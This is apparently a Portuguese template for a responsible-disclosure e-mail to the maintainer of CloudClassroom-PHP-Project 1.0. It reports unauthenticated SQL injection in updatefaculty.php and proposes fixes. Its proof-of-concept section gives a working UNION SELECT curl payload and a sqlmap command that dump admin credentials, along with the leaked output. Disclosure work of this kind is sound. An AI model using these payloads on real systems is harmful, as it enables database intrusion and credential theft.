# Modelo de e-mail ao fornecedor — CloudClassroom-PHP-Project 1.0 — SQL Injection em updatefaculty.php (parâmetro fid)

**Para:** Vishal Mathur (`mathurvishal`) — via GitHub Security Advisory privado do repositório, ou e-mail de contato do mantenedor
**De:** oliveira.luanalmeida@gmail.com e ethical.hacker.tiagoredivo@gmail.com
**Assunto:** [Security] CloudClassroom-PHP-Project 1.0 — SQL Injection em updatefaculty.php (CVSS 9.1)

---

Prezado(a) Vishal Mathur,

Meu nome é Luan Oliveira Ferreira de Alomeida e conduzo pesquisa de segurança responsável. Durante uma avaliação do projeto **CloudClassroom-PHP-Project 1.0** (https://github.com/mathurvishal/CloudClassroom-PHP-Project), identifiquei uma vulnerabilidade de **SQL Injection (UNION-based / error-based)** que gostaria de reportar de forma coordenada, antes de qualquer divulgação pública.

**Resumo técnico**
- Componente afetado: updatefaculty.php
- Parâmetro(s): fid (GET (+POST no UPDATE))
- Classe / CWE: SQL Injection (UNION-based / error-based) — CWE-89
- Severidade: CVSS v3.1 9.1 (Crítico) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
- Autenticação necessária: Nenhuma (via Broken Access Control — item 00; o design pediria sessão de admin)

**Descrição**
O parâmetro `fid` é interpolado sem aspas (numérico) na consulta SELECT. Em contexto numérico é possível `UNION SELECT`. A tabela consultada expõe 9 colunas. Confirmado com dump não-autenticado das credenciais de admin.

**Prova de conceito (ambiente de laboratório controlado)**
```
curl -s -G "http://127.0.0.1:9292/updatefaculty.php" \
  --data-urlencode "fid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"

sqlmap -u "http://127.0.0.1:9292/updatefaculty.php?fid=1" -p fid --batch --dump -T admin
```
Evidência observada:
```
[admin@ics.com:admin]
[vishu:vishu]
```

**Impacto**
Leitura arbitrária do banco (C:H) — PII, senhas em texto puro, credenciais de admin; escrita via o sink UPDATE/POST (I:H); comprometimento total em cadeia.

**Correção recomendada**
- Usar prepared statements com bind de parâmetros (`mysqli`/PDO) em 100% das consultas.
- Forçar o tipo dos identificadores numéricos (`(int)$id`) e usar allowlist quando aplicável.
- Não ecoar `$sql`/`mysqli_error()` ao cliente (remover oráculo de erro).
- Aplicar `exit;` após o guard de sessão (ver item 00).

**Divulgação coordenada**
Sigo uma política de divulgação responsável de 90 dias. Fico à disposição para esclarecer detalhes,
fornecer o PoC completo e validar a correção. Pretendo solicitar um CVE para esta questão; se preferir
coordenar a atribuição, por favor me avise.

Aguardo seu retorno e agradeço a atenção.

Atenciosamente,
Luan Oliveira Ferreira de Almeida
oliveira.luanalmeida@gmail.com
